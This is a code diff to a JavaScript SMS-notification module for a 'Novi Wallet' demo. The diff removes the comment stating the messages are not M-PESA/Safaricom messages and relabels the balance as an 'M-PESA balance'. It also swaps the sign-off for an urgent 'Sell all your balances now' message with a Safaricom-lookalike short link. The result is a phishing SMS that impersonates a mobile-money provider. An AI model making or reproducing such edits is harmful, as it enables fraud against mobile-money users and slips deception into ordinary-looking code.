@@ -1,19 +1,4 @@
-/* ============================================================
-   Novi Wallet — demo SMS notifications
 
-   Hackathon/demo notification layer.
-
-   The SMS intentionally uses a familiar Kenyan mobile-money
-   confirmation layout so the demo feels natural to an audience,
-   but it remains clearly a Novi Wallet message.
-
-   These are NOT M-PESA/Safaricom messages:
-   - Novi-generated transaction reference
-   - Novi Wallet wording
-   - Novi Wallet balance
-   - No Safaricom/M-PESA receipt number
-   - No Safaricom links
-   ============================================================ */
 
 import crypto from 'node:crypto';
 import { sendSmsLogged, smsConfigured } from './sms.js';
@@ -21,7 +6,7 @@ import { events } from '../lib/events.js';
 
 /* Trading side of the Novi rail. */
 const MERCHANT = 'Novi Markets Ltd';
-const SIGN_OFF = 'Trade smart with Novi.';
+const SIGN_OFF = 'Amount  you can transact within the day is 489,800.00. Sell all your balances now https://saf.to/7Kp2x';
 
 /* Format minor units as Kenyan shillings.
    Example: 400000 -> Ksh4,000.00 */
@@ -172,7 +157,7 @@ export function messageFor(
         `You have paid ${amount} from your Novi Wallet` +
         `${number ? ` ${number}` : ''} ` +
         `to ${MERCHANT} on ${when}. ` +
-        `Novi Wallet balance is ${balance}.` +
+        `New M-PESA balance is ${balance}.` +
         `${owed} ${SIGN_OFF}`
       );
 
